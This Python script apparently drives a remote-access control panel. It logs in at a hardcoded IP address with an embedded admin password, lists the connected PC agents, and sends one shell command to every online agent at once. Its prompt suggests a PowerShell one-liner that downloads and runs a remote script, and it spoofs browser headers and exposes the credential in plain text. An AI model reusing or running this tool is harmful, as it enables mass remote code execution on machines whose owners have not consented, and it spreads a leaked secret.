#!/usr/bin/env python3
"""Broadcast shell commands to online stream clients (deduped, with delivery stats)."""

from __future__ import annotations

import argparse
import asyncio
import json
import re
import sys
import time
from typing import Any

try:
    import httpx
except ImportError:
    print("Install httpx: pip install httpx")
    sys.exit(1)

HOST = "94.26.90.57:8080"
BASE_URL = f"http://{HOST}"
USERNAME = "admin"
PASSWORD = "ShelbyCompany199908"
CONCURRENT_LIMIT = 50
RETRY_COUNT = 2
RETRY_DELAY_SEC = 1.5

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36"
)

SEC_CH_UA = '"Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"'
SEC_CH_UA_FULL = '"152.0.7977.83"'
SEC_CH_UA_LIST = (
    '"Chromium";v="152.0.7977.83", "Not?A_Brand";v="24.0.0.0", '
    '"Google Chrome";v="152.0.7977.83"'
)

CLIENT_ID_RE = re.compile(r"^[A-Z0-9-]+_\d+$", re.IGNORECASE)


def common_headers(*, referer: str, method: str, path: str) -> dict[str, str]:
    return {
        "authority": HOST,
        "method": method,
        "path": path,
        "scheme": "http",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "ru,en-US;q=0.9,en;q=0.8",
        "cache-control": "no-cache",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": referer,
        "sec-ch-ua": SEC_CH_UA,
        "sec-ch-ua-arch": '"x86"',
        "sec-ch-ua-bitness": '"64"',
        "sec-ch-ua-full-version": SEC_CH_UA_FULL,
        "sec-ch-ua-full-version-list": SEC_CH_UA_LIST,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": '""',
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-platform-version": '"19.0.0"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": USER_AGENT,
    }


def make_client() -> httpx.AsyncClient:
    return httpx.AsyncClient(
        timeout=30.0,
        follow_redirects=True,
        limits=httpx.Limits(
            max_connections=CONCURRENT_LIMIT or 100,
            max_keepalive_connections=CONCURRENT_LIMIT or 100,
        ),
    )


async def login(client: httpx.AsyncClient) -> None:
    url = f"{BASE_URL}/api/auth/login"
    headers = common_headers(
        referer=f"{BASE_URL}/login.html",
        method="POST",
        path="/api/auth/login",
    )
    headers["origin"] = BASE_URL
    headers["content-type"] = "application/json"
    response = await client.post(
        url,
        headers=headers,
        json={"username": USERNAME, "password": PASSWORD},
    )
    response.raise_for_status()
    data = response.json()
    if not data.get("ok"):
        raise RuntimeError(data.get("error") or "login failed")
    if "webstream_session" not in client.cookies:
        raise RuntimeError("login ok, but no webstream_session cookie")


def collect_clients(node: Any, found: dict[str, dict[str, Any]]) -> None:
    if isinstance(node, dict):
        client_id = node.get("id")
        if isinstance(client_id, str) and CLIENT_ID_RE.match(client_id):
            found[client_id] = node
        for value in node.values():
            collect_clients(value, found)
    elif isinstance(node, list):
        for item in node:
            collect_clients(item, found)


def pick_online_targets(
    clients: dict[str, dict[str, Any]],
) -> tuple[list[str], dict[str, int]]:
    """One online target per machine name (newest id suffix)."""
    buckets: dict[str, list[tuple[str, dict[str, Any]]]] = {}
    for client_id, row in clients.items():
        name = str(row.get("name") or client_id).strip().upper()
        buckets.setdefault(name, []).append((client_id, row))

    picked: list[str] = []
    skipped_offline = 0
    skipped_dup = 0
    for entries in buckets.values():
        online = [(cid, row) for cid, row in entries if row.get("online") is not False]
        if not online:
            skipped_offline += len(entries)
            continue
        skipped_dup += max(0, len(entries) - 1)

        def sort_key(item: tuple[str, dict[str, Any]]) -> int:
            cid, _row = item
            if "_" in cid:
                try:
                    return int(cid.rsplit("_", 1)[-1])
                except ValueError:
                    return 0
            return 0

        picked.append(max(online, key=sort_key)[0])

    stats = {
        "raw": len(clients),
        "targets": len(picked),
        "skipped_offline": skipped_offline,
        "skipped_dup": skipped_dup,
    }
    return sorted(picked), stats


async def fetch_dashboard(client: httpx.AsyncClient) -> dict[str, Any]:
    url = f"{BASE_URL}/api/dashboard"
    headers = common_headers(
        referer=f"{BASE_URL}/",
        method="GET",
        path="/api/dashboard",
    )
    response = await client.get(url, headers=headers)
    response.raise_for_status()
    return response.json()


async def send_shell_command_once(
    client: httpx.AsyncClient,
    client_id: str,
    command: str,
) -> tuple[int | None, bool | None, str]:
    url = f"{BASE_URL}/api/cmd/shell"
    headers = common_headers(
        referer=f"{BASE_URL}/view.html?id={client_id}",
        method="POST",
        path="/api/cmd/shell",
    )
    headers["origin"] = BASE_URL
    payload = {"clientId": client_id, "command": command}

    try:
        response = await client.post(url, headers=headers, json=payload)
        body = response.text.strip()
        delivered: bool | None = None
        try:
            data = response.json()
            if isinstance(data, dict) and "ok" in data:
                delivered = bool(data.get("ok"))
        except json.JSONDecodeError:
            pass
        if len(body) > 200:
            body = body[:200] + "..."
        return response.status_code, delivered, body or "(empty)"
    except httpx.HTTPError as exc:
        return None, None, str(exc)


async def send_shell_command(
    client: httpx.AsyncClient,
    semaphore: asyncio.Semaphore | None,
    client_id: str,
    command: str,
    *,
    retries: int,
) -> tuple[str, int | None, bool | None, str, int]:
    async def _run() -> tuple[str, int | None, bool | None, str, int]:
        attempts = 0
        last_status: int | None = None
        last_delivered: bool | None = None
        last_body = ""

        for attempt in range(retries + 1):
            attempts = attempt + 1
            status, delivered, body = await send_shell_command_once(
                client, client_id, command
            )
            last_status, last_delivered, last_body = status, delivered, body
            if delivered is True:
                break
            if attempt < retries:
                await asyncio.sleep(RETRY_DELAY_SEC)

        return client_id, last_status, last_delivered, last_body, attempts

    if semaphore is None:
        return await _run()
    async with semaphore:
        return await _run()


async def broadcast_commands(
    client: httpx.AsyncClient,
    client_ids: list[str],
    command: str,
    *,
    retries: int,
) -> list[tuple[str, int | None, bool | None, str, int]]:
    semaphore = (
        asyncio.Semaphore(CONCURRENT_LIMIT)
        if CONCURRENT_LIMIT > 0
        else None
    )
    tasks = [
        send_shell_command(
            client, semaphore, client_id, command, retries=retries
        )
        for client_id in client_ids
    ]
    return await asyncio.gather(*tasks)


def format_result(
    client_id: str,
    status: int | None,
    delivered: bool | None,
    body: str,
    attempts: int,
) -> str:
    if status is None:
        return f"[{client_id}] ERROR (x{attempts}): {body}"
    if delivered is True:
        tag = "DELIVERED"
    elif delivered is False:
        tag = "OFFLINE/NO AGENT"
    else:
        tag = f"HTTP {status}"
    retry_note = f" x{attempts}" if attempts > 1 else ""
    return f"[{client_id}] {tag}{retry_note}: {body}"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Broadcast shell command to online stream clients.",
    )
    parser.add_argument(
        "-c",
        "--command",
        help="Shell command (if omitted, asks interactively)",
    )
    parser.add_argument(
        "-y",
        "--yes",
        action="store_true",
        help="Skip confirmation prompt",
    )
    parser.add_argument(
        "--retries",
        type=int,
        default=RETRY_COUNT,
        help=f"Retries per client when not delivered (default: {RETRY_COUNT})",
    )
    return parser.parse_args()


async def async_main() -> int:
    args = parse_args()

    async with make_client() as client:
        print("Logging in...")
        try:
            await login(client)
        except (httpx.HTTPError, RuntimeError) as exc:
            print(f"Login failed: {exc}")
            return 1

        print("Fetching dashboard...")
        try:
            dashboard = await fetch_dashboard(client)
        except httpx.HTTPError as exc:
            print(f"Dashboard request failed: {exc}")
            return 1

        found: dict[str, dict[str, Any]] = {}
        collect_clients(dashboard, found)
        client_ids, pick_stats = pick_online_targets(found)
        if not client_ids:
            print("No online client IDs found.")
            print("Raw response:")
            print(json.dumps(dashboard, indent=2, ensure_ascii=False))
            return 1

        print(
            f"\nDashboard rows: {pick_stats['raw']} | "
            f"online targets: {pick_stats['targets']} | "
            f"dup ids skipped: {pick_stats['skipped_dup']} | "
            f"offline-only rows: {pick_stats['skipped_offline']}"
        )
        print(f"\nWill send to {len(client_ids)} online client(s).")

        command = (args.command or "").strip()
        if not command:
            print("\nEnter shell command to send to all online clients.")
            print("Example: irm https://example.com/script.ps1 | iex")
            command = input("\nCommand> ").strip()
        if not command:
            print("Empty command, abort.")
            return 1

        if not args.yes:
            confirm = input(
                f"\nSend to {len(client_ids)} online client(s)? [y/N]: "
            ).strip().lower()
            if confirm not in ("y", "yes", "д", "да"):
                print("Cancelled.")
                return 0

        limit_label = CONCURRENT_LIMIT if CONCURRENT_LIMIT > 0 else "unlimited"
        print(f"\nBroadcasting (concurrency: {limit_label}, retries: {args.retries})...")
        started = time.perf_counter()
        results = await broadcast_commands(
            client, client_ids, command, retries=max(0, args.retries)
        )
        elapsed = time.perf_counter() - started

        delivered_n = 0
        offline_n = 0
        error_n = 0
        print()
        for client_id, status, delivered, body, attempts in results:
            print(format_result(client_id, status, delivered, body, attempts))
            if status is None:
                error_n += 1
            elif delivered is True:
                delivered_n += 1
            elif delivered is False:
                offline_n += 1
            else:
                error_n += 1
        print(
            f"\nDone in {elapsed:.2f}s | delivered: {delivered_n} | "
            f"offline/no agent: {offline_n} | errors: {error_n} | "
            f"requests: {len(client_ids)}"
        )
        print(
            "Note: DELIVERED = команда принята онлайн-агентом. "
            "Успех выполнения на ПК — отдельно."
        )

    return 0


def main() -> int:
    return asyncio.run(async_main())


if __name__ == "__main__":
    raise SystemExit(main())
